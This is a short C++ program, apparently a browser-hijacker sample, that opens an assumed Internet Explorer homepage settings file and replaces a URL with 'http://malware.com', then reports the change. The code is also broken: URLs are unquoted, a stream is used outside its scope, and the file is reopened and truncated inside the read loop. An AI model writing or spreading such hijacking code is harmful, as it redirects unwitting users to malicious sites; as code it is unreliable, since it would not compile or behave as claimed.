#include <iostream>
#include <fstream>
#include <string>

int main() {
    std::string filename = "C:\\Users\\YourUserName\\AppData\\Roaming\\Microsoft\\Internet Explorer\\HomePage"; // Replace with correct path to homepage settings file
    std::ifstream ifs(filename, std::ios::in);
    if (!ifs.is_open()) {
        std::cerr << "Could not open homepage settings file" << std::endl;
        return 1;
    }
    std::string line;
    while (std::getline(ifs, line)) {
        // Replace "http://example.com" with desired URL
        if (line == http://example.com) {
            line = http://malware.com;
        }
        std::ofstream ofs(filename, std::ios::out | std::ios::trunc);
        if (!ofs.is_open()) {
            std::cerr << "Could not open output file" << std::endl;
            return 1;
        }
        ofs << line << std::endl;
    }
    
    // Close files and print message
    ifs.close();
    ofs.close();
    std::cout << "Homepage settings modified to: http://malware.com" << std::endl;
}
